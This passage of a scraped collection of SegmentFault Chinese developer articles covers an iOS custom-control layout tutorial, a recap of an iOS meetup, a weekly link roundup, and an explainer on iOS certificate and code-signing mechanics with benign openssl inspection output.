<p>这个方法用来返回一个字符串渲染出来的边界，<code>boundingRectWithSize:CGSizeMake</code>这个方法比较复杂，初学者看不懂直接粘过来用下就行，这里不需要理解。<br>不过我还是要解释一下，这个方法传入的第一个CGSize是，外包围的限制，CGFLOAT_MAX返回的是最大的浮点数，也就是这里在计算宽度时不做限制。NSStringDrawingUsesFontLeading属性表示用自字体作为计算行高的标准，attributes字典传入的是文字的渲染样式，NSFontAttributeName键传入文字的字体和字号，返回的CGRect是文字根据以上要求，渲染出来的外包围。</p>
<pre><code>- (void)layoutSubviews
{
    [super layoutSubviews];

    [self.subviews enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) {
        if ([obj isKindOfClass:[UILabel class]]) {
            UILabel* label = obj;
            CGRect rect = [self boundsWithLabel:label];
            [label setFrame:CGRectMake(0, 0, rect.size.width, rect.size.height)];
            label.center = CGPointMake(self.frame.size.width/(self.number*2)*((label.tag-981)*2+1), self.frame.size.height/2);
        }
    }];
}</code></pre>
<p><strong>解释</strong><code>layoutSubviews </code>方法是UIView的固有方法，这个方法在我们View需要给子View布局的时候会自动调用，我们重写了这个方法，所以要用<code>super</code>指针，先调用父类方法<code>[super layoutSubviews];</code>，虽然<code>UIView</code>的<code>layoutSubviews</code>方法很有可能是空的，但这是好习惯。</p>
<p>然后我们又通过<code>subviews</code>数组快速遍历子View，筛选出<code>UILabel</code>对象，因为我们的子View中以后要加入其它不是<code>UILabel</code>的对象。遍历过程中我们改变Label的外包围，通过上面说的计算外包围的接口，然后通过<code>center(中心点)</code>这个<code>UIView</code>的属性来改变子Label的位置。<strong>label.tag-981</strong>是Label的序号，<strong>self.frame.size.width</strong>是我们SegmentView的宽度，<strong>self.number</strong>是label的个数。</p>
<p>然后我们再运行程序，是不是完成了Label的布局啦，并不复杂，下一篇我们将继续讲解。</p>

                ", iOS自定义控件教程（一）看看吧，总会得到你想要的,1531972068,304,1,109,1,1,https://segmentfault.com/a/1190000004231855
125,1,0,6,"
                    
<p>12 月 26 日，北京「iOS」站——本年度最后一场 D-Day 。加上这一场，SegmentFault 今年一共举办了 19 场 D-Day 线下技术沙龙，感谢大家一直以来的支持。这次 iOS 分享，我们邀请了滴滴快车 iOS 开发工程师戴铭、高德地图 iOS 研发工程师韩晓明、QQ浏览器 iOS 工程师庄延军、百度地图 SDK 高级研发工程师何瑾。本次活动，四位老师和大家分享了不少当前热门应用背后好玩的技术热点。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVrPIB"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>现场回顾</h2>
<p><span class=""img-wrap""><img data-src=""/img/bVrPDH"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>本次活动是由我们 SegmentFault Adele 主持，Adele 在简单介绍完 SegmentFault 的成长历程、行业背景后，将我们招聘这一重量级的产品线推出，最后，将 SegmentFault 主站改版的好消息告诉大家后，我们开始了本次 D-Day 的分享。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVrPDj"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>为什么要用 AutoLayout ？ AutoLayout 的生命周期又是怎么样的？项目中有哪些非必现 Bug？这次滴滴快车 iOS 开发工程师戴铭老师给大家带来的<a href=""http://pan.baidu.com/s/1pKsP6dX"" rel=""nofollow noreferrer"">《深入剖析 AutoLayout》</a>，干货非常多，在场小伙伴受益匪浅。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVrPE9"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>第二位分享嘉宾是高德地图 iOS 研发工程师韩晓明老师，分享议题是<a href=""http://pan.baidu.com/s/1o7wVsKi"" rel=""nofollow noreferrer"">《高德地图 iOS SDK 技术分享》</a>，主要内容包括 ①iOS SDK 作技术分享；②地图 SDK 相关知识；③ 搜索服务介绍；④定位相关知识；⑤ 导航 SDK 介绍；⑥开发遇到的问题。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVrPFM"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>「桌面系统中很少有应用因为使用内存过多而被 Kill 掉，为啥 iOS 会呢？」QQ 浏览器 iOS 工程师庄延军老师的问题，难倒了现场的部分同学。在分享议题<a href=""http://pan.baidu.com/s/1qX5EIIS"" rel=""nofollow noreferrer"">《iOS 内存管理及优化》</a>中，庄老师和大家聊了聊程序员对内存的关注点，iOS 内存管理，分析工具，最佳实践，最后还分析了一下业内趋势。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVrPGO"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>百度地图，相信大家都有在用吧，但大家对百度地图 SDK 技术和应用有作深入了解吗？本次分享，百度地图 SDK 高级研发工程师何瑾老师为大家带来了<a href=""http://pan.baidu.com/s/1qX5EIIS"" rel=""nofollow noreferrer"">《百度地图 SDK 技术与应用》</a>，内容包括百度地图 SDK 整理架构，地图、周边雷达等应用，以及百度地图 SDK 常见问题。</p>
<h2>圆桌环节</h2>
<p><span class=""img-wrap""><img data-src=""/img/bVrPMf"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>本次圆桌是由滴滴快车的戴铭老师主持，大家对戴老师的 AutoLayout 布局及庄老师的内存管理充满兴趣，在这一环节又问了很多问题。当然，在场的小伙伴也不会放过提问另外两位大牛的机会，韩晓明和何瑾老师就地图精确度、数据来源及采集策略等内容和大家进行更深一步的交流。在产品方面，现场还形成了小 PK。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVrPNn"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>D-Day 结束，非常感谢大家的积极参与。时间过得真快，2015 年就要过去，感谢各位 SFer 这一年来的支持与厚爱，2016 年，SegmentFault 会继续为大家带来好玩的线下技术沙龙和实用的经验分享。</p>
<h2>干货分割线</h2>
<ul>
<li><p><a href=""http://pan.baidu.com/s/1qXa5y8W"" rel=""nofollow noreferrer"">戴铭《深入剖析 AutoLayout》</a></p></li>
<li><p><a href=""http://pan.baidu.com/s/1o7wVsKi"" rel=""nofollow noreferrer"">韩晓明《高德地图 iOS SDK 技术分享》</a></p></li>
<li><p><a href=""http://pan.baidu.com/s/1qX5EIIS"" rel=""nofollow noreferrer"">庄延军《iOS 内存管理及优化》</a></p></li>
<li><p><a href=""http://pan.baidu.com/s/1i4zhxrf"" rel=""nofollow noreferrer"">何瑾《百度地图 SDK 技术与应用》</a></p></li>
</ul>
<p>因主题均为「iOS」，这里将<a href=""http://segmentfault.com/a/1190000004075427"" rel=""nofollow noreferrer"">广州场「iOS」</a>的一些内容分享给大家，希望能帮助到大家。包括：</p>
<ul>
<li><p><a href=""http://pan.baidu.com/s/1ntKpEBZ"" rel=""nofollow noreferrer"">离青《百川开放平台 iOS 架构实践》</a></p></li>
<li><p><a href=""http://pan.baidu.com/s/1eQ2naUI"" rel=""nofollow noreferrer"">董霖《iOS 远程日志系统》</a></p></li>
<li><p><a href=""http://pan.baidu.com/s/1pJEgvW3"" rel=""nofollow noreferrer"">李明杰《第三方框架的设计》</a></p></li>
<li><p><a href=""http://pan.baidu.com/s/1gdjolzX"" rel=""nofollow noreferrer"">周楷雯《程序员的自我修养》</a></p></li>
</ul>
<p>回顾链接：<a href=""http://segmentfault.com/a/1190000004075427"" rel=""nofollow noreferrer"">http://segmentfault.com/a/1190000004075427</a></p>

                ", SegmentFault D-Day 北京场「iOS」 活动回顾,1531972070,281,1,747,1,1,https://segmentfault.com/a/1190000004213557
126,1,0,6,"
                    
<p>雾霾天，宜撸代码、吹牛，不宜出门约会(¬_¬)ﾉ </p>
<p>本期 <a href=""http://fir.im/?utm_source=segmentfault&amp;utm_medium=link&amp;utm_content=fir_im_weekly151225"" rel=""nofollow noreferrer"">fir.im</a> Weekly 亦如往期，收集了优秀的  iOS/Android 开发资源，GitHub 源码、前端方面的热点分享。除了代码，也许你也应该了解技术趋势、程序员技能树等等。</p>
<h2>通过自动布局来实现 iOS 动画</h2>
<p>由 <a href=""http://weibo.com/realmchina?nick=RealmChina&amp;is_hot=1"" rel=""nofollow noreferrer"">@RealmChina</a> 分享。</p>
<p>在 <a href=""http://gotocon.com/cph-2015/"" rel=""nofollow noreferrer"">GOTO Conference CPH 2015</a> 的这次展示当中，Marin 为我们展示了如何在 Swift 中使用自动布局的 UI 来创建 UIKit 动画。文章最后还有福利！一个关于 iOS 9 UIStackView 的动画示例。<br>全文浏览，点击<a href=""https://realm.io/cn/news/gotocph-marin-todorov-auto-layout-animations-ios/"" rel=""nofollow noreferrer"">这里</a>.</p>
<h2>UITableView性能优化</h2>
<p><a href=""http://weibo.com/touristdiary"" rel=""nofollow noreferrer"">@南峰子_老驴</a>研究了<a href=""https://medium.com/@plasm"" rel=""nofollow noreferrer"">Alexander Orlov</a>的<a href=""https://medium.com/ios-os-x-development/perfect-smooth-scrolling-in-uitableviews-fd609d5275a5#.so9tpnlk1"" rel=""nofollow noreferrer"">这篇文章</a>，从自己的视角解释了下如何让UITableView更快更平滑，后面将会讨论iOS绘画系统和UIKit更深层次的一些东西，值得一看。文章<a href=""http://southpeak.github.io/blog/2015/12/20/perfect-smooth-scrolling-in-uitableviews/"" rel=""nofollow noreferrer"">传送门</a>.</p>
<h2>小笨狼与 LLDB 的故事</h2>
<p>对，这不是一个故事，这是<a href=""http://weibo.com/u/5592239559"" rel=""nofollow noreferrer"">@小笨狼Lc</a>写的关于LLDB技巧篇！！！</p>
<p>“LLDB的Xcode默认的调试器，它与LLVM编译器一起，带给我们更丰富的流程控制和数据检测的调试功能。平时用Xcode运行程序，实际走的都是LLDB。熟练使用LLDB，可以让你debug事半功倍。”</p>
<p>点击<a href=""http://www.jianshu.com/p/e89af3e9a8d7"" rel=""nofollow noreferrer"">这里</a>，浏览全文。</p>
<p><span class=""img-wrap""><img data-src=""http://7xju1s.com1.z0.glb.clouddn.com/image/8/3d/85ce3e99b49d61eb22ae9e82a6d74.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>Android WebView远程执行代码漏洞浅析</h2>
<p>WebView远程代码执行漏洞可以说是横扫了一大批的Android App，查询一些漏洞平台可以得到大致的情况，鉴于很多存在漏洞的App并没有披露，因此WebVeiw远程执行代码漏洞的影响程度会更大。</p>
<p><a href=""http://www.freebuf.com/author/%e7%bb%bf%e7%9b%9f%e7%a7%91%e6%8a%80"" rel=""nofollow noreferrer"">绿盟科技</a>分享了关于 Android WebView 远程执行代码漏的分析，感兴趣的点击<a href=""http://www.freebuf.com/vuls/90552.html"" rel=""nofollow noreferrer"">这里</a>.</p>
<h2>Android MVVM 到底是啥？看完就明白了</h2>
<p>极客联盟微信公众号干货很多，胡笛这篇文章讲述了 Android MVVM 框架 Data Binding Library 的使用，感兴趣的请点击<a href=""http://mp.weixin.qq.com/s?__biz=MzAwMDczNDY0MA==&amp;mid=400556753&amp;idx=1&amp;sn=c4f02e6d8477804816e2c5869a9852b3&amp;3rd=MzA3MDU4NTYzMw==&amp;scene=6#rd"" rel=""nofollow noreferrer"">这里</a></p>
<p><span class=""img-wrap""><img data-src=""http://7xju1s.com1.z0.glb.clouddn.com/image/7/b8/fe46f7a6103f939bad28bf249dfa3.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>15 分钟带你入门 Fuse</h2>
<p><a href=""http://weibo.com/kevinzhow"" rel=""nofollow noreferrer"">@周楷雯Kevin</a>分享了自己的第一篇 Fuse 的教程：</p>
<p>“<a href=""https://www.fusetools.com/"" rel=""nofollow noreferrer"">Fuse</a> 这个技术令人兴奋，不仅可以用来做交互原型，还可以导出成 iOS 和 Android 的原生 App 供生产使用，重点的重点在于输出的成品品质不错，所以私以为值得学习一下 （官方也表示以后会支持导出 Mac，Linux，Windows App）。”</p>
<p>同样对 Fuse 感兴趣的，请点击<a href=""http://tips.producter.io/15-fen-zhong-gao-su-ni-guan-yu-fuse-de-yi-qie/"" rel=""nofollow noreferrer"">这里</a></p>
<p><span class=""img-wrap""><img data-src=""http://7xju1s.com1.z0.glb.clouddn.com/image/c/09/546dbd8b74570aa2913c0731d5cc3.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>android-card-slide-panel 动画</h2>
<p>android-card-slide-panel 是一个模仿探探首页卡片左右滑动效果的 Android Demo, 滑动流畅，卡片view无限重生。GitHub 地址:<a href=""http://t.cn/RUkjmEQ"" rel=""nofollow noreferrer""></a><a href=""http://t.cn/RUkjmEQ"" rel=""nofollow noreferrer"">http://t.cn/RUkjmEQ</a> </p>
<p><span class=""img-wrap""><img data-src=""http://7xju1s.com1.z0.glb.clouddn.com/image/d/69/596dcfe8af85065a351225afe9f98.gif"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>Twitter 的 like 动画安卓版</h2>
<p><a href=""http://weibo.com/u/2711441293"" rel=""nofollow noreferrer"">@泡在网上编代码</a> 的分享关于 Twitter 的新版心形动画的制作过程。文章<a href=""http://www.jcodecraeer.com/a/anzhuokaifa/androidkaifa/2015/1224/3799.html"" rel=""nofollow noreferrer"">传送门</a><br><span class=""img-wrap""><img data-src=""http://7xju1s.com1.z0.glb.clouddn.com/image/8/f4/801b5155699d9615b9b1013659e79.gif"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>ReactNative变革无线前端-淘宝d2</h2>
<p><a href=""http://weibo.com/reactchina"" rel=""nofollow noreferrer"">@react-china</a> 社区整理的 【ReactNative变革无线前端-淘宝d2】的分享，点<a href=""https://github.com/hsavit1/Awesome-Swift-Education"" rel=""nofollow noreferrer"">这里</a>看看，最后也说道很多人关注关于 React Web ，也将在12月底正式开源。</p>
<p>关于前端界万人瞩目的 第十届<a href=""http://weibo.com/u/1820711170?is_all=1&amp;stat_date=201512#_rnd1451014588237"" rel=""nofollow noreferrer"">@D2前端技术论坛</a> 的视频和干货，会在<a href=""http://d2forum.alibaba-inc.com/"" rel=""nofollow noreferrer"">这里</a>更新.</p>
<h2>2015前端生态发展回顾</h2>
<p>回顾一下2015年前端的生态发展，<a href=""http://weibo.com/u/1893353241"" rel=""nofollow noreferrer"">Kuitos</a> 大致整理了几个比较有历史意义的事件。写的很棒，相信很多 前端er 会有共鸣。</p>
<p>文章<a href=""https://github.com/kuitos/kuitos.github.io/issues/32"" rel=""nofollow noreferrer"">传送门</a>.</p>
<h2>技术雷达 : 技术趋势分析报告</h2>
<p><a href=""http://weibo.com/u/1774908135?profile_ftype=1&amp;is_all=1#_rnd1451017351392"" rel=""nofollow noreferrer"">ThoughtWorks</a>发布了最新一期的技术雷达，提出了四个最新的技术动态，分别为：“Docker引爆容器生态系统”、“微服务及相关工具受到追捧”、“JavaScript工具正在趋于平稳”、“安全是每一个人的问题”。下载地址在<a href=""https://assets.thoughtworks.com/assets/technology-radar-nov-2015-cn.pdf"" rel=""nofollow noreferrer"">这里</a>.</p>
<h2>Developer 进阶书单</h2>
<p><a href=""http://weibo.com/phodal"" rel=""nofollow noreferrer""></a><a href=""/u/phodal"" rel=""nofollow noreferrer"">@Phodal</a> 做了一张基于D3.js与KnockOut.js的数据生成的技能树，地址：<a href=""https://github.com/phodal/developer"" rel=""nofollow noreferrer"">https://github.com/phodal/developer</a> ，主要分为以下几点：重构与设计模式、前端读书路线图、机器学习读书路线、架构与模式，看看是否对你有参考。在线地址：<a href=""http://t.cn/R44yAQS"" rel=""nofollow noreferrer"">http://t.cn/R44yAQS</a> ， 源码地址：<a href=""http://t.cn/R44yAQa"" rel=""nofollow noreferrer"">http://t.cn/R44yAQa</a> .</p>
<p><span class=""img-wrap""><img data-src=""http://7xju1s.com1.z0.glb.clouddn.com/image/6/1f/b32f7eb449b257a48f39aba85d68c.gif"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>————————————————</p>
<p>最近技术 Weekly 、头条的内容层出不穷， <a href=""http://fir.im/?utm_source=segmentfault&amp;utm_medium=link&amp;utm_content=fir_im_weekly151225"" rel=""nofollow noreferrer"">fir.im</a> Weekly  想做一些内容上的改变，你们有好的建议随时发邮件给 dm@fir.im 告诉我，同时欢迎分享更多的资源。</p>
<p>fir.im</p>

                ", fir.im Weekly - 除了写代码，还需要了解什么,1531972071,148,1,706,1,1,https://segmentfault.com/a/1190000004213061
127,1,0,6,"
                    
<p>原文：<a href=""http://www.pchou.info/ios/2015/12/14/ios-certification-and-code-sign.html"" rel=""nofollow noreferrer"">漫谈iOS程序的证书和签名机制</a></p>
<p>接触iOS开发半年，曾经也被这个主题坑的摸不着头脑，也在淘宝上买过企业证书签名这些服务，有大神都做了一个全自动的发布打包（不过此大神现在不卖企业证书了），甚是羡慕和崇拜。于是，花了一点时间去研究了一下iOS这套证书和签名机制，并撰文分享给需要的朋友。由于本人才疏学浅，多有遗漏或错误之处，还请大神多多指教。</p>
<h1>非对称加密和摘要</h1>
<h2>非对称加密的特性和用法</h2>
<p>非对称加密算法可能是世界上最重要的算法，它是当今电子商务等领域的基石。简而言之，非对称加密就是指加密密钥和解密密钥是不同的，而且加密密钥和解密密钥是成对出现。非对称加密又叫公钥加密，也就是说成对的密钥，其中一个是对外公开的，所有人都可以获得，称为公钥，而与之相对应的称为私钥，只有这对密钥的生成者才能拥有。公私钥具有以下重要特性：</p>
<ul>
<li><p>对于一个私钥，有且只有一个与之对应的公钥。生成者负责生成私钥和公钥，并保存私钥，公开公钥</p></li>
<li><p>公钥是公开的，但不可能通过公钥反推出私钥，或者说极难反推，只能穷举，所以只要密钥足够长度，要通过穷举而得到私钥，几乎是不可能的</p></li>
<li><p>通过私钥加密的密文只能通过公钥解密，公钥加密的密文只有通过私钥解密</p></li>
</ul>
<p>由于上述特性，非对称加密具有以下的典型用法：</p>
<ul>
<li><p>对信息保密，防止中间人攻击：将明文通过接收人的公钥加密，传输给接收人，因为只有接收人拥有对应的私钥，别人不可能拥有或者不可能通过公钥推算出私钥，所以传输过程中无法被中间人截获。只有拥有私钥的接收人才能阅读。此用法通常用于交换<code>对称密钥</code>。</p></li>
<li><p>身份验证和防止篡改：权限狗用自己的私钥加密一段授权明文，并将授权明文和加密后的密文，以及公钥一并发送出来，接收方只需要通过公钥将密文解密后与授权明文对比是否一致，就可以判断明文在中途是否被篡改过。此方法用于<code>数字签名</code>。</p></li>
</ul>
<p>著名的<code>RSA</code>算法就是非对称加密算法，<code>RSA</code>以三个发明人的首字母命名。</p>
<p>非对称加密算法如此强大可靠，却有一个弊端，就是加解密比较耗时。因此，在实际使用中，往往与对称加密和摘要算法结合使用。对称加密很好理解，此处略过1w字。我们再来看一下摘要算法。</p>
<h2>摘要算法</h2>
<p>另一个神奇的算法就是摘要算法。摘要算法是指，可以将任意长度的文本，通过一个算法，得到一个固定长度的文本。这里文本不一定只是文本，可以是字节数据。所以摘要算法试图将世间万物，变成一个固定长度的东西。摘要算法具有以下重要特性：</p>
<ul>
<li><p>只要源文本不同，计算得到的结果，必然不同</p></li>
<li><p>无法从结果反推出源（那是当然的，不然就能量不守恒了）</p></li>
</ul>
<p>典型的摘要算法，比如大名鼎鼎的<code>MD5</code>和<code>SHA</code>。摘要算法主要用于比对信息源是否一致，因为只要源发生变化，得到的摘要必然不同；而且通常结果要比源短很多，所以称为“摘要”。</p>
<h1>数字签名</h1>
<p>理解了非对称加密和摘要算法，来看一下数字签名。实际上数字签名就是两者结合。假设，我们有一段授权文本，需要发布，为了防止中途篡改文本内容，保证文本的完整性，以及文本是由指定的权限狗发的。首先，先将文本内容通过摘要算法，得到摘要，再用权限狗的私钥对摘要进行加密得到密文，将源文本、密文、和私钥对应的公钥一并发布即可。那么如何验证呢？</p>
<p>验证方首先查看公钥是否是权限狗的，然后用公钥对密文进行解密得到摘要，将文本用同样的摘要算法得到摘要，两个摘要进行比对，如果相等那么一切正常。这个过程只要有一步出问题就视为无效。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008382123?w=491&amp;h=338"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>数字签名可以快速验证文本的完整性和合法性，已广泛应用于各个领域。理解了数字签名以后，我们进一步来看什么是数字证书。</p>
<h1>数字证书</h1>
<h2>现实生活的证书</h2>
<p>证书顾名思义，就是权限机构的颁发的证明。比如英语6级证书，就是教育部门颁发给通过了6级考核的个人的证明，证明这个人的英语能力。我们来看一下这个证书的组成：</p>
<ul>
<li><p>被证明人：老王</p></li>
<li><p>内容：通过了英语六级</p></li>
<li><p>盖章：教育部门的公章或钢印</p></li>
</ul>
<p>于是老王就可以用这张证书找工作了，用人单位会通过查看证书的各项内容（尤其是公章），来验证证书的合法性和老王的能力。</p>
<p>在现实生活中，经常有假的6级证书，这些假证书最重要的就是有一个假公章。现实生活中使用法律法规来约束私刻假公章的行为，但是用人单位可能不能十分准确的判断公章是真是假。而这些问题在数字签名面前都可以用数学的方法严谨的解决。</p>
<h2>数字证书：用数字签名实现的证书</h2>
<p>实际上，数字证书就是通过数字签名实现的数字化的证书。在一般的证书组成部分中，还加入了其他的信息，比如证书有效期（好比驾驶证初次申领后6年有效），过了有效期，需要重新签发（驾驶证6年有效后需重新申领）。</p>
<p>跟现实生活中的签发机构一样，数字证书的签发机构也有若干，并有不同的用处。比如苹果公司就可以签发跟苹果公司有关的证书，而跟web访问有关的证书则是又几家公认的机构进行签发。这些签发机构称为<code>CA</code>（Certificate Authority）。</p>
<p>对于被签发人，通常都是企业或开发者。比如需要搭建基于SSL的网站，那么需要从几家国际公认的CA去申请证书；再比如需要开发iOS的应用程序，需要从苹果公司获得相关的证书。这些申请通常是企业或者开发者个人提交给CA的。当然申请所需要的材料、资质和费用都各不相同，是由这些CA制定的，比如苹果要求$99或者$299的费用。</p>
<p>之所以要申请证书，当然是为了被验证。英语6级证书的验证方一般是用人单位；web应用相关的SSL证书的验证方通常是浏览器；iOS各种证书的验证方是iOS设备。我们之所以必须从CA处申请证书，就是因为CA已经将整个验证过程规定好了。对于iOS，iOS系统已经将这个验证过程固化在系统中了，除非越狱，否则无法绕过。</p>
<h2>证书的授权链</h2>
<p>数字证书可能还包括证书链信息。举个例子：如果你要申请休假1周，需要你的上司审批，你的上司需要他的上司同意，最终需要大老板同意，那么这一层层的授权，形成了一个授权链，大老板是授权链的根(root)，中间这些环节分别是被更接近root的人授权的。</p>
<p>我们从苹果<code>MC</code>（Member Center）中获得的证书实际也是一个包含有证书链的证书，其中的根是苹果的CA。我们获得的证书实际上是在告诉iOS设备：<code>我们的证书是被苹果CA签过名的合法的证书</code>。而iOS设备在执行app前，首先要先验证CA的签名是否合法，然后再通过证书中我们的公钥验证程序是否的确是我们发布的，且中途没有对程序进行过篡改。</p>
<h1>iOS证书申请和签名打包流程图</h1>
<p>在继续下去之前，先来看一张图。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008382124?w=832&amp;h=752"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>这张图阐述了，开发iOS应用程序时，从申请证书，到打包的大致过程。接下来我将对图中的每一个环节进行分析。</p>
<h1>证书申请</h1>
<p>开发iOS程序，必然要进行的工作就是成为开发者，并申请相关的证书，否则你的程序只能在模拟器上运行，无法在真机上调试，更不要说上架了。那么在申请证书之前需要：</p>
<ol>
<li><p>支付$99或$299成为苹果开发者，并每年续费。这一步是苹果的强制规定，相当于霸王条款，没钱玩尼玛！大家都知道$99针对个人和小企业，$299针对大企业，这么分没错，不过你需要知道的是，两种金额的本质区别在于你可以获得的证书类型不同，$99当然比$299的少一些。</p></li>
<li><p>安装苹果开发者根证书，此证书实际上是我们从苹果MC中申请的所有证书的“根证书”，安装这个证书意味着我们的开发工具对此CA的信任，从而可以用此CA签发的其他证书进行签名和打包。一般而言，如果安装了Xcode，那么这个证书是自动安装在Key Chain中了。证书如下图</p></li>
</ol>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004840288"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>然后，我们就开始按照很多图文并茂的教程开始申请证书，各种操作。这里由于是讲原理，不展开这部分。我们来看每一步到底意味着什么。</p>
<h2>什么是CertificateSigningRequest.certSigningRequest</h2>
<p>我们需要生成一个<code>CertificateSigningRequest.certSigningRequest</code>文件来提交到MC中，从而获取某种证书。那么这个文件到底是什么呢?从上面的流程图中大家可以看到，这个文件包含两部分内容<a href=""https://en.wikipedia.org/wiki/Certificate_signing_request"" rel=""nofollow noreferrer"">(Certificate signing request)</a>：</p>
<ol>
<li><p>申请者信息，此信息是用申请者的<code>私钥</code>加密的</p></li>
<li><p>申请者公钥，此信息是申请者使用的<code>私钥</code>对应的公钥</p></li>
<li><p>摘要算法和公钥加密算法</p></li>
</ol>
<p>我们可以用openssl来解析文件中的内容一窥究竟：</p>
<pre><code>openssl asn1parse -i -in CertificateSigningRequest.certSigningRequest

    0:d=0  hl=4 l= 649 cons: SEQUENCE          
    4:d=1  hl=4 l= 369 cons:  SEQUENCE          
    8:d=2  hl=2 l=   1 prim:   INTEGER           :00
   11:d=2  hl=2 l=  68 cons:   SEQUENCE          
   13:d=3  hl=2 l=  36 cons:    SET               
   15:d=4  hl=2 l=  34 cons:     SEQUENCE          
   17:d=5  hl=2 l=   9 prim:      OBJECT            :emailAddress
   28:d=5  hl=2 l=  21 prim:      IA5STRING         :zhoupingtkbjb@163.com
   51:d=3  hl=2 l=  15 cons:    SET               
   53:d=4  hl=2 l=  13 cons:     SEQUENCE          
   55:d=5  hl=2 l=   3 prim:      OBJECT            :commonName
   60:d=5  hl=2 l=   6 prim:      UTF8STRING        :Parker
   68:d=3  hl=2 l=  11 cons:    SET               
   70:d=4  hl=2 l=   9 cons:     SEQUENCE          
   72:d=5  hl=2 l=   3 prim:      OBJECT            :countryName
   77:d=5  hl=2 l=   2 prim:      PRINTABLESTRING   :CN
   81:d=2  hl=4 l= 290 cons:   SEQUENCE          
   85:d=3  hl=2 l=  13 cons:    SEQUENCE          
   87:d=4  hl=2 l=   9 prim:     OBJECT            :rsaEncryption
   98:d=4  hl=2 l=   0 prim:     NULL              
  100:d=3  hl=4 l= 271 prim:    BIT STRING        
  375:d=2  hl=2 l=   0 cons:   cont [ 0 ]        
  377:d=1  hl=2 l=  13 cons:  SEQUENCE          
  379:d=2  hl=2 l=   9 prim:   OBJECT            :sha1WithRSAEncryption
  390:d=2  hl=2 l=   0 prim:   NULL              
  392:d=1  hl=4 l= 257 prim:  BIT STRING        
</code></pre>
<p>可以看到文件包含了我的信息，并标明使用了<code>sha1</code>摘要算法和<code>RSA</code>公钥加密算法。苹果的MC在拿到这个后，将这个信息记录下来，并签发出相关的证书。这里，苹果实际无需验证我的信息，因为如果我不交钱就没办法上传这个文件，也就得不到证书。</p>
<h2>从MC中申请到的证书究竟是什么</h2>
<p>苹果取出<code>CertificateSigningRequest.certSigningRequest</code>中的公钥，根本不管我的其他信息，然后将<code>我的MC账号信息</code>和我提交的公钥封装在证书中，并进行数字签名。以开发证书为例，我们用openssl来看一下证书的内容：</p>
<pre><code>openssl x509 -inform der -in ios_development.cer -noout -text

Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            65:97:cd:73:6f:19:37:c2
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=US, O=Apple Inc., OU=Apple Worldwide Developer Relations, CN=Apple Worldwide Developer Relations Certification Authority
        Validity
            Not Before: Jul 29 07:36:28 2015 GMT
            Not After : Jul 28 07:36:28 2016 GMT
        Subject: UID=8VPWB57FDW, CN=iPhone Developer: Liang Ding (2U967A2YJ6), OU=7XPNRZE9TC, O=Liang Ding, C=US
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
            RSA Public Key: (2048 bit)
                Modulus (2048 bit):
                    00:ab:43:a4:57:32:57:30:81:89:eb:b4:5c:b6:88:
                    7f:4f:59:3a:9e:f6:14:50:2c:5c:14:6d:01:58:bd:
                    d7:2b:a6:66:71:f7:d9:da:58:a2:e8:4c:d5:a9:87:
                    20:5b:b7:4c:58:29:3c:b3:48:de:7f:ad:3f:98:cc:
                    9d:b3:07:2f:93:4a:3a:e5:32:e2:fc:59:30:1e:ee:
                    65:11:c3:88:ea:7a:54:d8:60:56:d1:fa:69:06:40:
                    dd:72:1d:7f:d9:14:85:bf:7a:b0:a3:34:a0:ac:c1:
                    dc:a9:48:3c:9c:43:c8:e4:fd:02:eb:fe:d2:a7:ce:
                    2e:e4:9a:51:20:0b:5b:e5:5a:d4:04:9e:a4:52:8d:
                    c2:1e:1f:50:80:fb:ea:c1:e4:bb:b4:ec:35:fd:96:
                    6a:86:0a:62:fa:d2:5a:8b:34:1b:f2:c5:c8:c9:2c:
                    85:d1:4d:8c:cb:91:be:db:92:f0:88:37:7a:6d:8d:
                    ef:c6:e1:47:5c:e5:ca:e2:5a:47:14:5d:2f:5b:2e:
                    d4:df:61:d9:99:e2:3e:6b:24:b2:aa:36:b3:af:e6:
                    a8:a8:28:a7:8a:73:aa:68:a9:71:ac:81:a8:20:98:
                    bb:3e:76:e2:09:19:41:45:d7:9a:68:1b:7c:1d:f5:
